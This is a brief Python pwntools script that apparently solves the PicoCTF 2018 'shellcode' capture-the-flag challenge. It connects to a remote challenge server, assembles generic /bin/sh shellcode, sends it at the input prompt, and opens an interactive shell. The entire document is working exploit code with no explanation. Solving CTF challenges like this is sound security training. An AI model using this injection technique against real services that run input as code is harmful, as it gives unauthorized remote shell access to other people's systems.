from pwn import *
from LibcSearcher import *

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('../PicoCTF_2018_shellcode')
target = remote('node4.buuoj.cn', 27617)

shellcode = asm(shellcraft.sh())
target.sendlineafter('Enter a string!\n', shellcode)
target.interactive()